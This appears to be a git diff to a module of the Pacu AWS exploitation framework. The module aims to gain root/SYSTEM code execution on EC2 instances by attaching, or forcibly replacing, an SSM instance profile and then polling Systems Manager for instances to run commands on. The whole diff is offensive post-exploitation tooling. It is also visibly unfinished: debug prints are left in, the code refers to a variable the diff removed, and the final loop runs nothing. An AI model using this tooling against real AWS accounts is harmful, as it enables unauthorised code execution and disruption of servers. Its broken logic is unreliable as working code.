@@ -3,6 +3,7 @@ import boto3
 import argparse
 import os
 import re
+import time
 from botocore.exceptions import ClientError
 
 module_info = {
@@ -11,6 +12,9 @@ module_info = {
 
     # Name and any other notes about the author
     'author': 'Spencer Gietzen',
+
+    # Category of the module. Make sure the name matches an existing category.
+    'category': 'post_exploitation',
 
     # One liner description of the module functionality. This shows up when a user searches for modules.
     'one_liner': 'Tries to execute code as root/SYSTEM on EC2 instances.',
@@ -25,10 +29,15 @@ module_info = {
     'prerequisite_modules': ['enum_ec2'],
 
     # Module arguments to autocomplete when the user hits tab
-    'arguments_to_autocomplete': [],
+    'arguments_to_autocomplete': ['--all-instances', '--replace', '--ip-name', '--role-name'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
+
+parser.add_argument('--all-instances', required=False, default=False, action='store_true', help='Skip vulnerable operating system check and just target every instance')
+parser.add_argument('--replace', required=False, default=False, action='store_true', help='For EC2 instances that already have an instance profile attached to them, this argument will replace those with the Systems Manager instance profile. WARNING: This can cause bad things to happen! You never know what negative side effects this may have on a server without further inspection, because you do not know what permissions you are removing/replacing that the instance already had')
+parser.add_argument('--ip-name', required=False, default=None, help='The name of an existing instance profile with an "EC2 Role for Simple Systems Manager" attached to it. This will skip the automatic role/instance profile enumeration and the searching for a Systems Manager role/instance profile. Note: This argument takes priority over --role-name, so if both arguments are passed in, --role-name will be discarded')
+parser.add_argument('--role-name', required=False, default=None, help='The name of an existing "EC2 Role for Simple Systems Manager". If this argument is provided and --ip-name is not, this will skip the automatic role enumeration and the searching for a Systems Manager role and go straight to instance profile enumeration/searching')
 
 
 def help():
@@ -53,73 +62,78 @@ def main(args, pacu_main):
         return
     instances = session.EC2['Instances']
 
-    instance_profile = dict()
-
-    # Images
-    try:
-        client = boto3.client(
-            'ec2',
-            region_name='us-east-1',
-            aws_access_key_id=session.access_key_id,
-            aws_secret_access_key=session.secret_access_key,
-            aws_session_token=session.session_token,
-            config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-        )
-        dryrun = client.describe_images(
-            DryRun=True
-        )
-    except ClientError as error:
-        if not str(error).find('UnauthorizedOperation') == -1:
-            print('Dry run failed, the current AWS account does not have the necessary permissions to run "describe_images". Operating system enumeration is no longer trivial.\n')
-
     regions = get_regions('EC2')
 
-    os_with_default_ssm_agent = [
-        '[\s\S]*Windows[\s\S]*Server[\s\S]*2016[\s\S]*',
-        '[\s\S]*Amazon[\s\S]*Linux[\s\S]*',
-        '[\s\S]*Ubuntu[\s\S]*Server[\s\S]*18\\.04[\s\S]*LTS[\s\S]*'
-        #'Windows Server 2003-2012 R2 released after November 2016'
-    ]
+    targeted_instances = []
+    ssm_instance_profile_name = ''
+    ssm_role_name = ''
 
-    # Begin enumeration of vulnerable images
-    vuln_images = []
-    for region in regions:
-        image_ids = []
-        print('Starting region {}...\n'.format(region))
-        client = boto3.client(
-            'ec2',
-            region_name=region,
-            aws_access_key_id=session.access_key_id,
-            aws_secret_access_key=session.secret_access_key,
-            aws_session_token=session.session_token,
-            config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-        )
+    if args.all_instances is True:
+        # DryRun describe_images (don't need to DryRun this if args.all_instances is False)
+        try:
+            client = boto3.client(
+                'ec2',
+                region_name=regions[0],
+                aws_access_key_id=session.access_key_id,
+                aws_secret_access_key=session.secret_access_key,
+                aws_session_token=session.session_token,
+                config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
+            )
+            dryrun = client.describe_images(
+                DryRun=True
+            )
+        except ClientError as error:
+            if not str(error).find('UnauthorizedOperation') == -1:
+                print('Dry run failed, the current AWS account does not have the necessary permissions to run "describe_images". Operating system enumeration is no longer trivial.\n')
 
-        for instance in instances:
-            if instance['Region'] == region:
-                image_ids.append(instance['ImageId'])
-
-        # Describe all images being used in the environment
-        if image_ids == []:
-            print('  No images found.\n')
-        else:
-            images = client.describe_images(
-                ImageIds=list(set(image_ids))
-            )['Images']
-
-            # Iterate images and determine if they are possibly one of the operating systems with SSM agent installed by default
-            count = 0
-            for image in images:
-                os_details = '{} {} {}'.format(image['Description'], image['ImageLocation'], image['Name'])
-                for vuln_os in os_with_default_ssm_agent:
-                    result = re.match(r'{}'.format(vuln_os), os_details)
-                    if result is not None:
-                        count += 1
-                        vuln_images.append(image['ImageId'])
-                        break
-            print('  {} vulnerable images found.\n'.format(count))
-    print('Total vulnerable images found: {}\n'.format(len(vuln_images)))
     
+        os_with_default_ssm_agent = [
+            '[\s\S]*Windows[\s\S]*Server[\s\S]*2016[\s\S]*',
+            '[\s\S]*Amazon[\s\S]*Linux[\s\S]*',
+            '[\s\S]*Ubuntu[\s\S]*Server[\s\S]*18\\.04[\s\S]*LTS[\s\S]*',
+            #'Windows Server 2003-2012 R2 released after November 2016'
+        ]
+
+        # Begin enumeration of vulnerable images
+        vuln_images = []
+        for region in regions:
+            image_ids = []
+            print('Starting region {}...\n'.format(region))
+            client = boto3.client(
+                'ec2',
+                region_name=region,
+                aws_access_key_id=session.access_key_id,
+                aws_secret_access_key=session.secret_access_key,
+                aws_session_token=session.session_token,
+                config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
+            )
+
+            for instance in instances:
+                if instance['Region'] == region:
+                    image_ids.append(instance['ImageId'])
+
+            # Describe all images being used in the environment
+            if image_ids == []:
+                print('  No images found.\n')
+            else:
+                images = client.describe_images(
+                    ImageIds=list(set(image_ids))
+                )['Images']
+
+                # Iterate images and determine if they are possibly one of the operating systems with SSM agent installed by default
+                count = 0
+                for image in images:
+                    os_details = '{} {} {}'.format(image['Description'], image['ImageLocation'], image['Name'])
+                    for vuln_os in os_with_default_ssm_agent:
+                        result = re.match(r'{}'.format(vuln_os), os_details)
+                        if result is not None:
+                            count += 1
+                            vuln_images.append(image['ImageId'])
+                            break
+                print('  {} vulnerable images found.\n'.format(count))
+        print('Total vulnerable images found: {}\n'.format(len(vuln_images)))
+    
+    # Begin Systems Manager role finder/creator
     client = boto3.client(
         'iam',
         aws_access_key_id=session.access_key_id,
@@ -128,15 +142,13 @@ def main(args, pacu_main):
         config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
     )
 
-    # Begin Systems Manager role finder/creator
     ssm_policy = client.get_policy(
         PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
     )['Policy']
 
-    ssm_role_name = ''
     if ssm_policy['AttachmentCount'] > 0:
         if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles') is False:
-            print('Pre-req module not run successfully. Exiting...')
+            print('Pre-req module not run successfully. Exiting...\n')
             return
         roles = session.IAM['Roles']
 
@@ -166,12 +178,15 @@ def main(args, pacu_main):
                     # For each key in the dict, check if it equal ec2.amazonaws.com
                     for key in statement['Principal']:
                         if statement['Principal'][key] == 'ec2.amazonaws.com':
+                            print(role['RoleName'])
                             attached_policies = client.list_attached_role_policies(
-                                RoleName=role['RoleName'],
-                                PathPrefix='/service-role/'
+                                RoleName=role['RoleName']
                             )['AttachedPolicies']
+                            print(attached_policies)
                             # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
                             for policy in attached_policies:
+                                print(policy['PolicyArn'])
+                                print(policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM')
                                 if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
                                     ssm_role_name = role['RoleName']
                                     break
@@ -202,7 +217,7 @@ def main(args, pacu_main):
             print('  Unable to create the required role: {}\n'.format(str(error)))
             return
     else:
-        print('Found valid SystemsManager service role: {}. Checking if it is associated with an instance profile...'.format(ssm_role_name))
+        print('Found valid SystemsManager service role: {}. Checking if it is associated with an instance profile...\n'.format(ssm_role_name))
 
         # Find instance profile belonging to that role
         response = client.list_instance_profiles_for_role(
@@ -211,28 +226,29 @@ def main(args, pacu_main):
         )
 
         if len(response['InstanceProfiles']) > 0:
-            instance_profile = response['InstanceProfiles'][0]
-            print('Found valid instance profile: {}.'.format(instance_profile['InstanceProfileName']))
-        # Else, leave instance_profile == dict()
+            ssm_instance_profile_name = response['InstanceProfiles'][0]['InstanceProfileName']
+            print('Found valid instance profile: {}.\n'.format(ssm_instance_profile_name))
+        # Else, leave ssm_instance_profile_name == ''
 
     # If no instance profile yet, create one with the role we have
-    if instance_profile == {}:
+    if instance_profile == '':
         # There is no instance profile yet
         try:
             # Create a new instance profile
-            instance_profile = client.create_instance_profile(
+            ssm_instance_profile_name = client.create_instance_profile(
                 InstanceProfileName='SSM'
-            )['InstanceProfile']
+            )['InstanceProfile']['InstanceProfileName']
 
             # Attach our role to the new instance profile
             client.add_role_to_instance_profile(
-                InstanceProfileName=instance_profile['InstanceProfileName'],
+                InstanceProfileName=ssm_instance_profile_name,
                 RoleName=ssm_role_name
             )
         except Exception as error:
             print('  Unable to create an instance profile: {}\n'.format(str(error)))
             return
 
+    # Start attaching the instance profile to the vulnerable instances
     client = boto3.client(
         'ec2',
         aws_access_key_id=session.access_key_id,
@@ -241,24 +257,106 @@ def main(args, pacu_main):
         config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
     )
 
-    # Start attaching the instance profile to the vulnerable instances
+    print('Starting to attach the instance profile to vulnerable EC2 instances...\n')
+    # args.replace is the static argument passed in from the user, but the
+    # variable replace can be modified in cases where the call is failing,
+    # likely due to permissions, but I give the user a choice below in the
+    # error handling section
+    replace = args.replace
     for region in regions:
+        # instances_to_replace will be filled up as each instance is checked for
+        # each region. The describe_iam_instance_profile_associations API call
+        # supports multiple instance IDs as filters, so by collecting a list and
+        # then running the API call once for all IDs, it minimizes the amount of
+        # total API calls made.
+        instances_to_replace = []
         for instance in instances:
             if instance['Region'] == region:
-                if instance['ImageId'] in vuln_images:
+                if args.all_instances is True or instance['ImageId'] in vuln_images:
                     if 'IamInstanceProfile' in instance:
-                        # If we need to replace the current instance profile to do this
-                        # For now, skipping this as it could be harmful to an environment
-                        pass
+                        # The instance already has an instance profile attached, skip it if
+                        # args.replace is not True, otherwise add it to instances_to_replace
+                        if args.replace is True and replace is True:
+                            instances_to_replace.append(instance['InstanceId'])
+                        else:
+                            print('  Instance ID {} already has an instance profile attached to it, skipping...'.format(instance['InstanceId']))
+                            pass
                     else:
                         # There is no instance profile attached yet, do it now
                         response = client.associate_iam_instance_profile(
+                            InstanceId=instance['InstanceId'],
                             IamInstanceProfile={
-                                'Name': instance_profile['InstanceProfileName'],
-                                'Arn': instance_profile['Arn']
-                            },
-                            InstanceId=instance['InstanceId']
+                                'Name': ssm_instance_profile_name
+                            }
                         )
+                        targeted_instances.append(instance['InstanceId'])
+                        print('  Instance profile attached to instance ID {}.'.format(instance['InstanceId']))
+        if len(instances_to_replace) > 0 and replace is True:
+            # There are instances that need their role replaced, so discover association IDs to make that possible
+            all_associations = []
+            response = client.describe_iam_instance_profile_associations(
+                Filters=[
+                    {
+                        'Name': 'instance-id',
+                        'Values': instances_to_replace
+                    }
+                ]
+            )
+            all_associations.extend(response['IamInstanceProfileAssociations'])
+            while 'NextToken' in response:
+                response = client.describe_iam_instance_profile_associations(
+                    NextToken=response['NextToken'],
+                    Filters=[
+                        {
+                            'Name': 'instance-id',
+                            'Values': instances_to_replace
+                        }
+                    ]
+                )
+                all_associations.extend(response['IamInstanceProfileAssociations'])
+
+            # Start replacing the instance profiles
+            for instance_id in instances_to_replace:
+                for association in all_associations:
+                    if instance_id == association['InstanceId']:
+                        association_id = association['AssociationId']
+                        break
+                try:
+                    client.replace_iam_instance_profile_association(
+                        AssociationId=association_id,
+                        IamInstanceProfile={
+                            'Name': ssm_instance_profile_name
+                        }    
+                    )
+                    targeted_instances.append(instance_id)
+                    print('  Instance profile replaced for instance ID {}.'.format(instance_id))
+                except Exception as error:
+                    print('  Failed to run replace_iam_instance_profile_association on instance ID {}: {}\n'.format(instance_id, str(error)))
+                    replace = input('Do you want to keep trying to replace instance profiles, or skip the rest based on the error shown? (y/n) ')
+                    if replace == 'y':
+                        replace = True
+                    else:
+                        replace = False
+                        break
+            
+    print('  Done.\n')
+
+    # Start polling SystemsManager/RunCommand to see if instances show up
+    print('Waiting for targeted instances to appear in Systems Manager... This will be checked every 30 seconds for 10 minutes (or until all targeted instances have shown up, whichever is first). After each check, the shell command will be executed against all new instances that showed up since the last check. If an instance has not shown up after 10 minutes, it most likely means that it does not have the SSM Agent installed and is not vulnerable to this attack.')
+    client = boto3.client(
+        'ssm',
+        aws_access_key_id=session.access_key_id,
+        aws_secret_access_key=session.secret_access_key,
+        aws_session_token=session.session_token,
+        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
+    )
+
+    # Check 20 times in 30 second intervals or until all targeted instances have been attacked
+    for i in range(0, 20):
+        response = client.describe_instance_information()
+
+        time.sleep(30)
+
 
     print('{} completed.'.format(os.path.basename(__file__)))
     return
